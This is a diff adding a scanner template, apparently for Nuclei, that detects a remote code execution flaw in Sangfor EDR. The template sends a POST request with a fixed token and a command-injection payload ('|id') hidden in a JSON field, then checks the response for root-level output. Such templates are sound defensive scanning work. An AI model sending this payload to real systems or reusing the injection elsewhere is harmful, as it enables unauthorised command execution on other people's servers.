@@ -1,0 +1,28 @@
+id: sangfor-edr-cssp-rce
+info:
+  name: Sangfor Edr Cssp Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"params":"w=123\"''1234123''\"|id"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "uid=0(root)"
